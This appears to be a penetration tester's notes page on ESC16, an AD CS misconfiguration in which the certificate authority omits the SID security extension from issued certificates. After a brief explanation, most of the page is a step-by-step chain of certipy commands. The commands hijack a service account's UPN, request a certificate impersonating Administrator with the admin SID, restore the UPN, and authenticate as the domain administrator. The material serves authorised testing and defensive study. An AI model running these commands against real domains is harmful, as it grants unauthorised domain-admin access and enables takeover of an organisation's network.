# ESC16

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**ESC16**</mark> is a <mark style="color:purple;">**misconfiguration**</mark> in Active Directory Certificate Services where the CA is globally set—via the `DisableExtensionList` registry key or due to missing patches—to omit the `szOID_NTDS_CA_SECURITY_EXT` SID extension from all issued certificates, which breaks strong certificate-to-user mapping and allows attackers, under certain conditions (like DCs set to compatibility mode or combined with ESC6), to spoof UPNs or inject SIDs in SAN fields to impersonate privileged accounts using forged certificates.

> <mark style="color:yellow;">**ESC6:**</mark> Lets you **inject your own UPN and SID** into the **SAN (Subject Alternative Name)** field of a certificate request.

> <mark style="color:yellow;">**ESC16:**</mark> The CA is **misconfigured to&#x20;**_**not**_**&#x20;include the SID extension** (`szOID_NTDS_CA_SECURITY_EXT`) in certificates.

## <mark style="color:yellow;">EXPLOITATION</mark>

> If you would look into Certipy's docs, there is Scenario A and Scenario B, this is a little bit of both. Updating UPN part is from Scenario A, and requesting certificate with adding our UPN and SID is from Scenario B

#### Updating UPN

```bash
certipy account -u 'some_svc@militech.local' -hashes wubbalubbadubdub -dc-ip '13.13.13.13' -upn 'Administrator' -user 'some_svc' update
```

#### Exctracting Admin's SID

```bash
certipy account -u 'some_svc@militech.local' -hashes wubbalubbadubdub -dc-ip '13.13.13.13' -upn 'Administrator' -user 'some_svc' read
```

#### Requesting valid Admin's cert

```bash
certipy req -u 'some_svc@militech.local' -hashes wubbalubbadubdub -dc-ip '13.13.13.13' -target 'dc01.militech.local' -ca 'militech-DC01-CA' -template 'User' -upn 'administrator@militech.local' -sid 'S-1-5-21-...-500'
```

#### Updating back UPN

```bash
certipy account -u 'some_svc@militech.local' -hashes wubbalubbadubdub -dc-ip '13.13.13.13' -upn 'some_svc' -user 'some_svc' update       
```

#### Authenticating as Admin

```bash
certipy auth -pfx 'administrator.pfx' -username 'Administrator' -domain militech.local -dc-ip '13.13.13.13'
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally" %}
